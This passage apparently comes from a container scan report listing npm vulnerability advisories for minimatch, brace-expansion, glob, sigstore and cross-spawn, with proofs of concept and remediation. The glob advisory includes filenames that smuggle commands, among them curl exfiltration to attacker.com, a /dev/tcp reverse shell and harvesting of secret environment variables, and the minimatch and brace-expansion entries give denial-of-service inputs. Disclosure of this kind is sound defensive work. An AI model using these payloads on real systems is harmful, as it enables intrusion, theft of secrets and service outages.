[2026-02-20T09:41:17.624Z] pattern="*(*(*(a|b)))" path="aaaaaaaaaaaaaaaaaaaz"
[2026-02-20T09:42:21.775Z] done in 64149ms result=false
[2026-02-20T09:42:21.779Z] pattern="*(a|b)" path="aaaz"
[2026-02-20T09:42:21.779Z] done in 0ms result=false
```

The server reports `"ms":"0"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.

Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.

---

### Impact

Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.

Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.

`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).

**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27903?s=github&n=minimatch&t=npm&vr=%3E%3D9.0.0%2C%3C9.0.7"><img alt="high 7.5: CVE--2026--27903" src="https://img.shields.io/badge/CVE--2026--27903-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Inefficient Algorithmic Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=9.0.0<br/><9.0.7</code></td></tr>
<tr><td>Fixed version</td><td><code>9.0.7</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.517%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:

| k (globstars) | Pattern size | Time     |
|---------------|--------------|----------|
| 7             | 36 bytes     | ~154ms   |
| 9             | 46 bytes     | ~1.2s    |
| 11            | 56 bytes     | ~5.4s    |
| 12            | 61 bytes     | ~9.7s    |
| 13            | 66 bytes     | ~15.9s   |

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
```

Terminal 1 -- start the server:
```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:
```
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**
```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>brace-expansion</strong> <code>2.0.1</code> (npm)</summary>

<small><code>pkg:npm/brace-expansion@2.0.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-13149?s=github&n=brace-expansion&t=npm&vr=%3E%3D2.0.0%2C%3C2.1.2"><img alt="high 7.7: CVE--2026--13149" src="https://img.shields.io/badge/CVE--2026--13149-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0.0<br/><2.1.2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.1.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P/S:N/AU:Y/R:U/V:D/RE:M/U:Amber</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.361%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
brace-expansion's expand() exhibits exponential-time - O(2ⁿ) - behavior in the number of consecutive non-expanding {} groups. A short, all-ASCII input (~90 bytes/30 groups) blocks the calling thread for minutes; a slightly longer input hangs it effectively indefinitely. Because the dominant consumers run on Node's single-threaded event loop, one small input can fully stall a worker/process.

In `expand_`, `post` is computed unconditionally at the top of the function, before the early-return branches that don't use it:
```js
const post = m.post.length ? expand_(m.post, max, false) : [''];   // always recurses
  ...
if (!isSequence && !isOptions) {
  if (m.post.match(/,(?!,).*\}/)) {
    str = m.pre + '{' + m.body + escClose + m.post;
    return expand_(str, max, true); // restart — `post` discarded
  }
  return [str];
}
```

For input like a{},{},…, the first {} is non-expanding, so control reaches the {a},b} rewrite branch - but `expand_` has already recursed into post over the entire remaining tail, only to throw the result away.
Each level therefore spawns two recursive expansions over essentially the same remaining work: `T(n) = 2·T(n−1) ⇒ O(2ⁿ)`.

The max option does not mitigate this: max only bounds the output-building loops; neither the post recursion nor the rewrite recursion consults it.
  
Measured on 5.0.6:

| groups (n) | input bytes | time |
|---|---|---|
| 20 | 60 | 130 ms |
| 24 | 72 | 1.9 s |
| 26 | 78 | 7.8 s |
| 30 (PoC) | 90 | ~2 min |

### Proof of concept
```js
const { expand } = require('brace-expansion');
// 30 non-expanding groups, ~90 bytes — blocks for minutes:
expand('a{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}');
```

### Impact

Any application that passes attacker-influenced strings to brace-expansion.expand() - directly or transitively via minimatch/glob brace patterns - can be driven into a multi-minute-to-indefinite CPU hang by a tiny request, denying service on that thread/process.

### Remediation

Upgrade to a patched release. The fix:
1. Defers computing post until after the early-return branches (and computes it locally in the $-suffix branch), so post is only expanded when a brace set actually expands and the value is used. This alone removes the exponential.
1. Converts the {a},b} rewrite from recursion to an in-function loop, so a long run of rewrites cannot grow the call stack.

Verified: the PoC drops from ~2 min to 0.55 ms, 5,000 groups complete in ~344 ms, and output is identical to 5.0.6 across a behavioral-equivalence suite (sequences, padding, $-prefix, a{},b}c, {},a}b, x{{a,b}}y, etc.). Post-fix complexity is ~O(n²) on this input class - acceptable for the security fix; a linear rewrite can be a non-urgent follow-up.

If immediate upgrade isn't possible, avoid passing untrusted input to expand() / glob brace patterns, or run such expansion under a timeout/worker.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>glob</strong> <code>10.4.2</code> (npm)</summary>

<small><code>pkg:npm/glob@10.4.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-64756?s=github&n=glob&t=npm&vr=%3E%3D10.2.0%2C%3C10.5.0"><img alt="high 7.5: CVE--2025--64756" src="https://img.shields.io/badge/CVE--2025--64756-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code>>=10.2.0<br/><10.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>11.1.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.136%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.

### Details

**Root Cause:**
The vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:

```javascript
stream.on('end', () => foregroundChild(cmd, matches, { shell: true }))
```

**Technical Flow:**
1. User runs `glob -c <command> <pattern>` 
2. CLI finds files matching the pattern
3. Matched filenames are collected into an array
4. Command is executed with matched filenames as arguments using `shell: true`
5. Shell interprets metacharacters in filenames as command syntax
6. Malicious filenames execute arbitrary commands

**Affected Component:**
- **CLI Only:** The vulnerability affects only the command-line interface
- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected
- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)

**Attack Surface:**
- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.
- Any directory where attackers can control filenames (PR branches, archives, user uploads)
- CI/CD pipelines using `glob -c` on untrusted content

### PoC

**Setup Malicious File:**
```bash
mkdir test_directory && cd test_directory

# Create file with command injection payload in filename
touch '$(touch injected_poc)'
```

**Trigger Vulnerability:**
```bash
# Run glob CLI with -c option
node /path/to/glob/dist/esm/bin.mjs -c echo "**/*"
```

**Result:**
- The echo command executes normally
- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell
- A new file `injected_poc` is created, proving command execution
- Any command can be injected this way with full user privileges

**Advanced Payload Examples:**

**Data Exfiltration:**
```bash
# Filename: $(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)
touch '$(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)'
```

**Reverse Shell:**
```bash
# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
touch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'
```

**Environment Variable Harvesting:**
```bash
# Filename: $(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)
touch '$(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)'
```

### Impact

**Arbitrary Command Execution:**
- Commands execute with full privileges of the user running glob CLI
- No privilege escalation required - runs as current user
- Access to environment variables, file system, and network

**Real-World Attack Scenarios:**

**1. CI/CD Pipeline Compromise:**
- Malicious PR adds files with crafted names to repository
- CI pipeline uses `glob -c` to process files (linting, testing, deployment)
- Commands execute in CI environment with build secrets and deployment credentials
- Potential for supply chain compromise through artifact tampering

**2. Developer Workstation Attack:**
- Developer clones repository or extracts archive containing malicious filenames
- Local build scripts use `glob -c` for file processing
- Developer machine compromise with access to SSH keys, tokens, local services

**3. Automated Processing Systems:**
- Services using glob CLI to process uploaded files or external content
- File uploads with malicious names trigger command execution
- Server-side compromise with potential for lateral movement

**4. Supply Chain Poisoning:**
- Malicious packages or themes include files with crafted names
- Build processes using glob CLI automatically process these files
- Wide distribution of compromise through package ecosystems

**Platform-Specific Risks:**
- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing
- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL
- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform

### Affected Products

- **Ecosystem:** npm
- **Package name:** glob
- **Component:** CLI only (`src/bin.mts`)
- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)
- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)
- **Patched versions:** 11.1.0and 10.5.0

**Scope Limitation:**
- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe
- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable

### Remediation

- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.
- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.
- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>sigstore</strong> <code>2.3.1</code> (npm)</summary>

<small><code>pkg:npm/sigstore@2.3.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-48815?s=github&n=sigstore&t=npm&vr=%3C%3D4.1.0"><img alt="high 7.5: CVE--2026--48815" src="https://img.shields.io/badge/CVE--2026--48815-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Verification of Cryptographic Signature</i>

<table>
<tr><td>Affected range</td><td><code><=4.1.0</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.190%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The documented `certificateOIDs` option in `sigstore.verify()` is accepted by the public API but discarded before verification, so required certificate extension OIDs are never checked.

### Details

The public verify options include `certificateOIDs` and the documentation says those OID/value pairs “must be present in the certificate’s extension list.” The policy-construction path used by `sigstore.verify()` and `createVerifier()` only copies the SAN and issuer settings into the verification policy and completely ignores `certificateOIDs`.

As a result, callers can believe they are constraining verification to certificates carrying specific Fulcio or workload-identifying OIDs, while the actual verifier never receives those constraints. Any bundle that satisfies the remaining checks is accepted even if the required OID extensions are absent or mismatched.

This is reachable from supported usage through the documented `certificateOIDs` verify option.

### PoC

```javascript
const { createVerificationPolicy } = require("sigstore/dist/config");

const policy = createVerificationPolicy({
  certificateIssuer: "https://issuer.example",
  certificateIdentityEmail: "victim@example.com",
  certificateOIDs: {
    "1.2.3.4": "required-value",
  },
});

console.log("certificateOIDs" in policy, JSON.stringify(policy));
// false {"subjectAlternativeName":"victim@example.com","extensions":{"issuer":"https://issuer.example"}}
```

### Impact

Applications that rely on `certificateOIDs` to restrict which certificates may sign artifacts receive no such protection. Unauthorized certificates that should be rejected on extension policy can be accepted as long as they satisfy the remaining verification checks.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>brace-expansion</strong> <code>5.0.6</code> (npm)</summary>

<small><code>pkg:npm/brace-expansion@5.0.6</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-13149?s=github&n=brace-expansion&t=npm&vr=%3E%3D3.0.0%2C%3C5.0.7"><img alt="high 7.7: CVE--2026--13149" src="https://img.shields.io/badge/CVE--2026--13149-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=3.0.0<br/><5.0.7</code></td></tr>
<tr><td>Fixed version</td><td><code>5.0.7</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P/S:N/AU:Y/R:U/V:D/RE:M/U:Amber</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.361%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
brace-expansion's expand() exhibits exponential-time - O(2ⁿ) - behavior in the number of consecutive non-expanding {} groups. A short, all-ASCII input (~90 bytes/30 groups) blocks the calling thread for minutes; a slightly longer input hangs it effectively indefinitely. Because the dominant consumers run on Node's single-threaded event loop, one small input can fully stall a worker/process.

In `expand_`, `post` is computed unconditionally at the top of the function, before the early-return branches that don't use it:
```js
const post = m.post.length ? expand_(m.post, max, false) : [''];   // always recurses
  ...
if (!isSequence && !isOptions) {
  if (m.post.match(/,(?!,).*\}/)) {
    str = m.pre + '{' + m.body + escClose + m.post;
    return expand_(str, max, true); // restart — `post` discarded
  }
  return [str];
}
```

For input like a{},{},…, the first {} is non-expanding, so control reaches the {a},b} rewrite branch - but `expand_` has already recursed into post over the entire remaining tail, only to throw the result away.
Each level therefore spawns two recursive expansions over essentially the same remaining work: `T(n) = 2·T(n−1) ⇒ O(2ⁿ)`.

The max option does not mitigate this: max only bounds the output-building loops; neither the post recursion nor the rewrite recursion consults it.
  
Measured on 5.0.6:

| groups (n) | input bytes | time |
|---|---|---|
| 20 | 60 | 130 ms |
| 24 | 72 | 1.9 s |
| 26 | 78 | 7.8 s |
| 30 (PoC) | 90 | ~2 min |

### Proof of concept
```js
const { expand } = require('brace-expansion');
// 30 non-expanding groups, ~90 bytes — blocks for minutes:
expand('a{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}');
```

### Impact

Any application that passes attacker-influenced strings to brace-expansion.expand() - directly or transitively via minimatch/glob brace patterns - can be driven into a multi-minute-to-indefinite CPU hang by a tiny request, denying service on that thread/process.

### Remediation

Upgrade to a patched release. The fix:
1. Defers computing post until after the early-return branches (and computes it locally in the $-suffix branch), so post is only expanded when a brace set actually expands and the value is used. This alone removes the exponential.
1. Converts the {a},b} rewrite from recursion to an in-function loop, so a long run of rewrites cannot grow the call stack.

Verified: the PoC drops from ~2 min to 0.55 ms, 5,000 groups complete in ~344 ms, and output is identical to 5.0.6 across a behavioral-equivalence suite (sequences, padding, $-prefix, a{},b}c, {},a}b, x{{a,b}}y, etc.). Post-fix complexity is ~O(n²) on this input class - acceptable for the security fix; a linear rewrite can be a non-urgent follow-up.

If immediate upgrade isn't possible, avoid passing untrusted input to expand() / glob brace patterns, or run such expansion under a timeout/worker.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>cross-spawn</strong> <code>7.0.3</code> (npm)</summary>

<small><code>pkg:npm/cross-spawn@7.0.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-21538?s=github&n=cross-spawn&t=npm&vr=%3E%3D7.0.0%2C%3C7.0.5"><img alt="high 7.7: CVE--2024--21538" src="https://img.shields.io/badge/CVE--2024--21538-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code>>=7.0.0<br/><7.0.5</code></td></tr>
<tr><td>Fixed version</td><td><code>7.0.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.873%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>glob</strong> <code>10.4.5</code> (npm)</summary>

<small><code>pkg:npm/glob@10.4.5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-64756?s=github&n=glob&t=npm&vr=%3E%3D10.2.0%2C%3C10.5.0"><img alt="high 7.5: CVE--2025--64756" src="https://img.shields.io/badge/CVE--2025--64756-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code>>=10.2.0<br/><10.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>11.1.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.136%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.

### Details

**Root Cause:**
The vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:

```javascript
stream.on('end', () => foregroundChild(cmd, matches, { shell: true }))
```

**Technical Flow:**
1. User runs `glob -c <command> <pattern>` 
2. CLI finds files matching the pattern
3. Matched filenames are collected into an array
4. Command is executed with matched filenames as arguments using `shell: true`
5. Shell interprets metacharacters in filenames as command syntax
6. Malicious filenames execute arbitrary commands

**Affected Component:**
- **CLI Only:** The vulnerability affects only the command-line interface
- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected
- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)

**Attack Surface:**
- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.
- Any directory where attackers can control filenames (PR branches, archives, user uploads)
- CI/CD pipelines using `glob -c` on untrusted content

### PoC

**Setup Malicious File:**
```bash
mkdir test_directory && cd test_directory

# Create file with command injection payload in filename
touch '$(touch injected_poc)'
```

**Trigger Vulnerability:**
```bash
# Run glob CLI with -c option
node /path/to/glob/dist/esm/bin.mjs -c echo "**/*"
```

**Result:**
- The echo command executes normally
- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell
- A new file `injected_poc` is created, proving command execution
- Any command can be injected this way with full user privileges

**Advanced Payload Examples:**

**Data Exfiltration:**
```bash
# Filename: $(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)
touch '$(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)" > /dev/null 2>&1)'
```

**Reverse Shell:**
```bash
# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
touch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'
```

**Environment Variable Harvesting:**
```bash
# Filename: $(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)
touch '$(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)'
```

### Impact

**Arbitrary Command Execution:**
- Commands execute with full privileges of the user running glob CLI
- No privilege escalation required - runs as current user
- Access to environment variables, file system, and network

**Real-World Attack Scenarios:**

**1. CI/CD Pipeline Compromise:**
- Malicious PR adds files with crafted names to repository
- CI pipeline uses `glob -c` to process files (linting, testing, deployment)
- Commands execute in CI environment with build secrets and deployment credentials
- Potential for supply chain compromise through artifact tampering

**2. Developer Workstation Attack:**
- Developer clones repository or extracts archive containing malicious filenames
- Local build scripts use `glob -c` for file processing
- Developer machine compromise with access to SSH keys, tokens, local services

**3. Automated Processing Systems:**
- Services using glob CLI to process uploaded files or external content
- File uploads with malicious names trigger command execution
- Server-side compromise with potential for lateral movement

**4. Supply Chain Poisoning:**
- Malicious packages or themes include files with crafted names
- Build processes using glob CLI automatically process these files
- Wide distribution of compromise through package ecosystems

**Platform-Specific Risks:**
- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing
- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL
- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform

### Affected Products

- **Ecosystem:** npm
- **Package name:** glob
- **Component:** CLI only (`src/bin.mts`)
- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)
- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)
- **Patched versions:** 11.1.0and 10.5.0

**Scope Limitation:**
- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe
- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable

### Remediation

- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.
